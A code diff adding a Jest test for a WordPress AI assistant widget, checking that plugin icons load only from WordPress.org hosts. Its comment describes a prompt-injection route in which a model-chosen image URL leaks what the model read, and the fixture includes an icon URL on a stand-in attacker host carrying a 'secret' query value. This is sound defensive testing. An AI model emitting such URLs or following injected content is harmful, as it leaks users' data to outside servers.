@@ -171,3 +171,52 @@ describe( 'AiAssistant — error recovery link', () => {
 		).toBe( 'Boom.' );
 	} );
 } );
+
+/**
+ * A plugin card's icon is a URL the model copied out of the WordPress.org
+ * results, and an image loads without a click. Only WordPress.org's hosts
+ * are fetched: a URL that a prompt injection picked could carry what the
+ * model read to someone else's server.
+ */
+describe( 'AiAssistant — admin link icons', () => {
+	let assistant: AiAssistant;
+
+	beforeEach( () => {
+		installHooksStub();
+		assistant = new AiAssistant( BASE_CONFIG );
+	} );
+
+	afterEach( () => {
+		assistant.close();
+		document
+			.querySelectorAll( '#desktop-mode-ai-assistant' )
+			.forEach( ( el ) => el.remove() );
+		clearHooksStub();
+	} );
+
+	test( 'paints a WordPress.org plugin icon and fetches no other URL', () => {
+		const pluginIcon = 'https://ps.w.org/wordpress-seo/assets/icon-128x128.gif?rev=3419908';
+		const link = { url: 'https://example.test/wp-admin/', description: '' };
+
+		assistant.open();
+		assistant[ '_showResult' ]( 'seo', {
+			answer_type: 'navigation',
+			message: 'Some SEO plugins.',
+			entity: null,
+			admin_links: [
+				{ ...link, title: 'Yoast SEO', icon: pluginIcon },
+				{ ...link, title: 'Elsewhere', icon: 'https://attacker.example/i.png?d=secret' },
+				{ ...link, title: 'Plugins', icon: 'dashicons-admin-plugins' },
+			],
+			iterations: 2,
+			exhausted: false,
+			continue: null,
+		} );
+
+		const icons = document.querySelectorAll( '.os-ai__admin-link-icon' );
+		expect( icons[ 0 ].getAttribute( 'src' ) ).toBe( pluginIcon );
+		expect( document.querySelector( '[src*="attacker.example"]' ) ).toBeNull();
+		expect( icons[ 1 ].classList.contains( 'dashicons-admin-generic' ) ).toBe( true );
+		expect( icons[ 2 ].classList.contains( 'dashicons-admin-plugins' ) ).toBe( true );
+	} );
+} );
